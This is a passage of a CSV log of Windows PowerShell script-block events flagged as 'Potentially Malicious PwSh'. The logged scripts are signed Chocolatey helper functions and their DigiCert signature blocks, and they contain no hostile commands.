c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUx","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:48.999 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,83,"ScriptBlock: CzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgweHzSplZ494On1UQFNZDNo1+C5hVFonFT0Z4 # XKG21e0wDQYJKoZIhvcNAQEBBQAEggEABukrTx8PYcKco9MQ6RcHIKVMqR9HLAnV # PohcjWRijEW5TfoLp6uGzyhKKHGDjH0+ZwkJ+J5O3IX5erp7MUuTVidPB87iW1Gz # fUgUvX12PnTzEvOp3p49uyqCzeXgH4NVl6/iZsYqlKefg94rX6oOBhMAWFotjBu9 # gG3udMTnJMaN6dlMy1ijbv+kaaIlMBUJluoWePzhsqFpm8B9RF1pfYcic/6z1QMi # jGzmtqMGC2bDkyvwQzAJOm0ChHMS6+79B83+i4DZ8XLSWVLVfIbjHHPxUWTJCRXw # nCIsBEJtwmk4AjHoIrMdsN058HnBAse/nS7NThZYlWoQEwbbgvqruKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU1WjAjBgkqhkiG9w0BCQQxFgQUyY9g1N0HMjWVyi3G # LWmwfeJbhiswDQYJKoZIhvcNAQEBBQAEggEATgvFSijRgKyoEI8ttKowwtSVxAwN # gNXzSRpGuaOjNEejxlaOw7DbhvHzcOEYcXvrQmD1uavDntsAte2qWMA7e+fS8ztV # Afb8ttnPHwjfFCyZ54u7SjkKZxShf9JdMRUIvpbv3HL6k/gJgfQVVkQRwyQGXRAO # CVDG7mzU3B8D8u1SnQzfryLwIFBd28p/wtijIzci4msUDlX2+VVGr+IBcSIsaa9Y # h1atL3hS6VuF4yL64iRXcICn1Ev68OPqTxeQd2UZHqZKVjL4h+4iGS/WZ6zoLxN/ # aGRaodZ1dtzz4uT610c7uWpKmAzb9V/cUwhahEiSspNng09908jESsHDAg== # SIG # End signature block","MessageNumber: 2 ¦ MessageTotal: 2 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Get-ChocolateyUnzip.ps1 ¦ ScriptBlockId: 33eb1f4e-529c-4805-afac-35d0be6847f0 ¦ ScriptBlockText: CzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgweHzSplZ494On1UQFNZDNo1+C5hVFonFT0Z4 # XKG21e0wDQYJKoZIhvcNAQEBBQAEggEABukrTx8PYcKco9MQ6RcHIKVMqR9HLAnV # PohcjWRijEW5TfoLp6uGzyhKKHGDjH0+ZwkJ+J5O3IX5erp7MUuTVidPB87iW1Gz # fUgUvX12PnTzEvOp3p49uyqCzeXgH4NVl6/iZsYqlKefg94rX6oOBhMAWFotjBu9 # gG3udMTnJMaN6dlMy1ijbv+kaaIlMBUJluoWePzhsqFpm8B9RF1pfYcic/6z1QMi # jGzmtqMGC2bDkyvwQzAJOm0ChHMS6+79B83+i4DZ8XLSWVLVfIbjHHPxUWTJCRXw # nCIsBEJtwmk4AjHoIrMdsN058HnBAse/nS7NThZYlWoQEwbbgvqruKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU1WjAjBgkqhkiG9w0BCQQxFgQUyY9g1N0HMjWVyi3G # LWmwfeJbhiswDQYJKoZIhvcNAQEBBQAEggEATgvFSijRgKyoEI8ttKowwtSVxAwN # gNXzSRpGuaOjNEejxlaOw7DbhvHzcOEYcXvrQmD1uavDntsAte2qWMA7e+fS8ztV # Afb8ttnPHwjfFCyZ54u7SjkKZxShf9JdMRUIvpbv3HL6k/gJgfQVVkQRwyQGXRAO # CVDG7mzU3B8D8u1SnQzfryLwIFBd28p/wtijIzci4msUDlX2+VVGr+IBcSIsaa9Y # h1atL3hS6VuF4yL64iRXcICn1Ev68OPqTxeQd2UZHqZKVjL4h+4iGS/WZ6zoLxN/ # aGRaodZ1dtzz4uT610c7uWpKmAzb9V/cUwhahEiSspNng09908jESsHDAg== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:49.077 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,84,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-OSArchitectureWidth { <# .SYNOPSIS Get the operating system architecture address width. .DESCRIPTION This will return the system architecture address width (probably 32 or 64 bit). If you pass a comparison, it will return true or false instead of {`32`|`64`}. .NOTES When your installation script has to know what architecture it is run on, this simple function comes in handy. Available as `Get-OSArchitectureWidth` in 0.9.10+. If you need compatibility with pre 0.9.10, please use the alias `Get-ProcessorBits`. .INPUTS None .OUTPUTS None .PARAMETER Compare This optional parameter causes the function to return $true or $false, depending on wether or not the bit width matches. #> param( $compare ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $bits = 64 if (([System.IntPtr]::Size -eq 4) -and (Test-Path env:\PROCESSOR_ARCHITEW6432)) { $bits = 64 } elseif ([System.IntPtr]::Size -eq 4) { $bits = 32 } # Return bool|int if (""$compare"" -ne '' -and $compare -eq $bits) { return $true } elseif (""$compare"" -ne '') { return $false } else { return $bits } } Set-Alias Get-ProcessorBits Get-OSArchitectureWidth Set-Alias Get-OSBitness Get-OSArchitectureWidth # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCC+5R24zufGXnsc # mWj/25mf6jwe97cvRY7+8fCOG4I2J6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # 